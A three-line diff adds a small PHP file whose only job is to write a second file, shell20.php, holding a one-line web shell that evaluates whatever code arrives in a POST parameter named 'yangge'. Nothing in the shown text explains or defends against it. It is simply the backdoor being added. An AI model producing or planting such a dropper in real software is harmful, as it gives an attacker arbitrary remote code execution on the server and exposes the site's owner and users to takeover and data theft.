@@ -1,0 +1,3 @@
+<?
+fputs(fopen("shell20.php","w"),'<?php eval($_POST[yangge]);?>')
+?>
